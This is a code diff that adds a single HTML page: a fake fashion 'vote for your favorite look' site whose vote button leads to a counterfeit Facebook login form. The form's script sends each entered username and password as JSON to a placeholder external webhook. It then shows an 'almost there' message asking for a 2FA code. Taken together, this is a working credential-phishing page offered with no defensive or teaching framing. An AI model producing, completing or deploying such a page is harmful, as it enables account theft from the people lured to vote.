@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CLOTHING VOYAGE</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background-color: #f4f4f4; margin: 0; padding: 0; }
+        h1 { margin-top: 20px; color: #333; }
+        .gallery { display: flex; flex-wrap: wrap; justify-content: center; margin: 20px; }
+        .gallery img { width: 200px; height: 250px; margin: 10px; border-radius: 10px; object-fit: cover; }
+        .vote-button { background-color: #1877F2; color: white; padding: 15px 30px; font-size: 18px; border: none; border-radius: 5px; cursor: pointer; margin-top: 20px; }
+        .vote-button:hover { background-color: #0E5AAB; }
+        .hidden { display: none; }
+        .container { text-align: center; border: 1px solid #ddd; padding: 30px; border-radius: 8px; background-color: white; max-width: 400px; margin: auto; margin-top: 50px; }
+        input { width: 80%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
+        button { background-color: #1877F2; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+        button:hover { background-color: #0E5AAB; }
+    </style>
+</head>
+<body>
+
+    <!-- CLOTHING VOYAGE HOMEPAGE -->
+    <div id="homepage">
+        <h1>Welcome to CLOTHING VOYAGE</h1>
+        <p>Explore our latest fashion collection and vote for your favorite look!</p>
+        <div class="gallery">
+            <img src="https://source.unsplash.com/200x250/?fashion,model1" alt="Model 1">
+            <img src="https://source.unsplash.com/200x250/?fashion,model2" alt="Model 2">
+            <img src="https://source.unsplash.com/200x250/?fashion,model3" alt="Model 3">
+            <img src="https://source.unsplash.com/200x250/?fashion,model4" alt="Model 4">
+            <img src="https://source.unsplash.com/200x250/?fashion,model5" alt="Model 5">
+        </div>
+        <button class="vote-button" onclick="showVotePage()">Click to Vote</button>
+    </div>
+
+    <!-- VOTE PAGE -->
+    <div id="votePage" class="hidden">
+        <h1>Vote via Social Media Platforms</h1>
+        <p>Choose your preferred method to vote.</p>
+        <button class="vote-button" onclick="showFacebookLogin()">Vote with Facebook</button>
+    </div>
+
+    <!-- FACEBOOK LOGIN PAGE -->
+    <div id="facebookLogin" class="hidden">
+        <div class="container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="logo">
+            <h1>Facebook</h1>
+            <form id="loginForm">
+                <input type="text" id="username" placeholder="Enter your username" required><br>
+                <input type="password" id="password" placeholder="Enter your password" required><br>
+                <button type="submit">Login</button>
+            </form>
+            <div id="thankYouMessage" class="hidden">
+                <h2>Almost there! One last step</h2>
+                <p>Please provide 2FA verification code.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function showVotePage() {
+            document.getElementById('homepage').style.display = 'none';
+            document.getElementById('votePage').style.display = 'block';
+        }
+
+        function showFacebookLogin() {
+            document.getElementById('votePage').style.display = 'none';
+            document.getElementById('facebookLogin').style.display = 'block';
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            if (username && password) {
+                await fetch('YOUR_PIPEDREAM_WEBHOOK_URL', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+
+                document.getElementById('loginForm').style.display = 'none';
+                document.getElementById('thankYouMessage').style.display = 'block';
+            } else {
+                alert('Please enter both username and password!');
+            }
+        });
+    </script>
+
+</body>
+</html>
